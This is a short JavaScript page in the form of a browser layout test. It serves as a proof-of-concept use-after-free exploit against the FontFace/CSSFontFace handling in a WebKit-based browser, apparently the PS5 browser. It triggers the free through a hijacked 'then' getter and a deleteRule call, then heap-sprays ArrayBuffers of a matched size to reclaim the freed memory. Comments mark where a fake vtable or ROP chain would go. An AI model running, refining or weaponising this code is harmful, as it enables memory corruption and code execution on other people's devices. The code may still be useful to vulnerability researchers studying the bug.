<script>
if (window.testRunner) {
    testRunner.dumpAsText();
    testRunner.waitUntilDone();
}

// Global array to maintain references and prevent garbage collection of the spray
var memoryGroomingBlocks = [];

// Staggered allocation to avoid OOM (Out Of Memory) crashes on console hardware
function executeStaggeredHeapSpray() {
    // Precise size matching the internal CSSFontFace structure
    const targetSize = 0x38; 
    
    // Significantly reduced loop to stay under the PS5 browser memory limit
    const safeSprayLimit = 250;    

    for (let i = 0; i < safeSprayLimit; i++) {
        try {
            // Allocate exact chunk sizes
            let sprayBuffer = new ArrayBuffer(targetSize);
            let view = new Uint32Array(sprayBuffer);
            
            // Populate the newly allocated memory with controlled data
            // In a live exploit, this would be the fake vtable pointer or ROP chain base
            for (let j = 0; j < view.length; j++) {
                view[j] = 0x41414141; 
            }
            
            memoryGroomingBlocks.push(sprayBuffer);
        } catch (e) {
            // Silently catch allocation failures to prevent script termination
            break; 
        }
    }
}

window.onload = () => {
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                // Transition internal state
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                
                // Trigger the Use-After-Free: Delete the rule referencing the C++ object
                document.getElementById('s').sheet.deleteRule(0);
                
                // Force an immediate synchronous layout flush to process the deletion in memory
                document.body.offsetTop;

                // Immediately execute the staggered spray to reclaim the exact memory address
                // before the C++ engine attempts to reuse the dangling pointer
                executeStaggeredHeapSpray();
            }
            return undefined;
        }
    });

    // Initiate the vulnerable font loading sequence
    document.fonts.load('1em x', 'AB');
    
    setTimeout(() => {
        if (window.testRunner)
            testRunner.notifyDone();
    }, 0);
};
</script>
